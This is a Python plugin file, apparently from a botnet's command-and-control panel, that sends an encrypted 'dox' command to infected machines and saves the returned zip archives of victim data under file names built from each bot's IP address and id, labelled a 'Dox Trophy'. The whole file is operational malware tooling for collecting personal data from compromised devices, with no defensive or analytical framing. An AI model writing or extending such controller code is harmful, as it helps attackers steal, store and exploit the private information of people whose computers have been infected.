# plugins/dox.py
from PyQt6.QtWidgets import QMessageBox
from .base_plugin import BasePlugin
import ujson as json
import binascii
import zipfile

# Plugin metadata for loader
plugin_info = {
    'name': 'Dox Trophy',
    'priority': 20,
    'handled_types': ['dox_response']
}


class DoxPlugin(BasePlugin):
    def __init__(self, parent):
        super().__init__(parent)
        self.name = "Dox Trophy"
        self.menu_action = self.name
        self.priority = 20

    def execute(self, target):
        if target == 'all' and len(self.parent.device_status) > 10:
            QMessageBox.warning(self.parent, 'Warning', 'Too many connections, please select one.')
            return
        command = {'type': 'command', 'target': target, 'action': 'dox'}
        try:
            self.parent.transport.send_command(command, encrypt=True)
            self.parent.log_buffered(f"Sent command: {command}")
        except Exception as e:
            self.parent.log_buffered(f"Failed to send dox command: {e}")

    def handle_response(self, data):
        if data.get('type') == 'dox_response':
            ip = data['ip']
            bot_id = data['id']
            zip_hex = data['zip_data']
            zip_bytes = binascii.unhexlify(zip_hex)
            filename = f"dox_{ip}_{bot_id}.zip"
            with open(filename, 'wb') as f:
                f.write(zip_bytes)
            self.parent.log_buffered(f"Saved dox data to {filename}")